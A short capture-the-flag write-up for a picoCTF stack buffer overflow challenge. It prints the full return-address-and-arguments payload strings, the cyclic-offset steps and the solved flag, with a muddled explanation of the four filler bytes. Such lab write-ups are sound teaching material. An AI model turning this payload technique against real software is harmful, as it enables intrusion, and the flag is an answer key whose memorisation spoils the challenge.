# Contents
- Task Description
- Notes


## Task Description
Control the return address and arguments This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/346/vuln)? You can view source [here](https://artifacts.picoctf.net/c/346/vuln.c). And connect with it using `nc saturn.picoctf.net 50954`

## Notes
Looking at the source code there are 2 arguments that need to be passed in. 
 - 0xCAFEF00D
 - 0XF00DF00D

Cause an overflow using python to generate a cyclic pattern
```python
from pwn import *
g = cyclic_gen()
g.get(100)
g.find("daac")
```
buffer of 112

get ret addr.
0x08049296

generate payload (LSB)
```python2
print "A"*112+"\x96\x92\x04\x08"+"\x0D\xF0\xFE\xCA"+"\x0D\xF0\x0D\xF0"
```
This gives an error and when checking the stack the first argument is missing. Checking the source code again there seems to be a fgets, to counter this adding 4 bytes after the ret addr will fill up the fgets and still pass in the 2 arguments.

```python2
print "A"*112+"\x96\x92\x04\x08"+"BBBB"+"\x0D\xF0\xFE\xCA"+"\x0D\xF0\x0D\xF0"
```
passing this to the nc session gives the flag.
```flag
picoCTF{argum3nt5_4_d4yZ_31432deb}
```


---
Creation date: 23-10-2022

Last modified date: Sunday 23rd October 2022
***
